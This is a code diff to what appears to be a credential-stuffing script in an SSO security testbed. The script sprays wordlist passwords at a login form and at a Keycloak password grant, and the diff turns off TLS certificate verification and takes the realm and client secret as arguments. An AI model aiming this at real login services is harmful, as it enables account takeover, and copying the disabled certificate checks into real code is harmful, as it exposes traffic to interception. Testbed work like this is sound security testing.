@@ -21,11 +21,13 @@ import time
 import urllib.request
 import urllib.parse
 import urllib.error
+import ssl
 from pathlib import Path
 from typing import Tuple
 
 EMAIL         = "testuser@example.com"
 WORDLIST_PATH = Path(__file__).parent.parent / "wordlists" / "top100_passwords.txt"
+SSL_CTX = ssl._create_unverified_context()
 
 
 def attempt_form(base_url: str, path: str, email: str, password: str) -> Tuple[int, float]:
@@ -36,7 +38,7 @@ def attempt_form(base_url: str, path: str, email: str, password: str) -> Tuple[i
     req.add_header("User-Agent",   "sso-testbed-attacker/1.0")
     t0 = time.monotonic()
     try:
-        with urllib.request.urlopen(req, timeout=10) as resp:
+        with urllib.request.urlopen(req, timeout=10, context=SSL_CTX) as resp:
             return resp.status, time.monotonic() - t0
     except urllib.error.HTTPError as e:
         return e.code, time.monotonic() - t0
@@ -60,7 +62,7 @@ def attempt_keycloak(kc_url: str, realm: str, client_id: str, client_secret: str
     req.add_header("User-Agent", "sso-testbed-attacker/1.0")
     t0 = time.monotonic()
     try:
-        with urllib.request.urlopen(req, timeout=10) as resp:
+        with urllib.request.urlopen(req, timeout=10, context=SSL_CTX) as resp:
             return resp.status, time.monotonic() - t0
     except urllib.error.HTTPError as e:
         return e.code, time.monotonic() - t0
@@ -76,6 +78,9 @@ def main():
 
     base_url = sys.argv[1]
     wordlist = Path(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].startswith("http") else WORDLIST_PATH
+    realm = sys.argv[3] if len(sys.argv) > 3 else "profile-a-vulnerable"
+    client_id = sys.argv[4] if len(sys.argv) > 4 else "sso-test-app"
+    client_secret = sys.argv[5] if len(sys.argv) > 5 else "testpass123"
 
     is_keycloak = "keycloak" in base_url
     is_profile_b = "app-b" in base_url
@@ -88,13 +93,6 @@ def main():
         return
 
     if is_keycloak:
-        realm = "profile-a-vulnerable"
-        client_id = "sso-test-app"
-        client_secret = "testpass123"
-        if "hard" in base_url:
-            realm = "profile-a-hardened"
-            client_secret = "Str0ngCl!entS3cr3t_changeme"
-
         passwords = [p.strip() for p in wordlist.read_text().splitlines() if p.strip()]
         max_attempts = min(20, len(passwords))
         print(f"[A2] Credential stuffing via Keycloak ROPC: {base_url}")
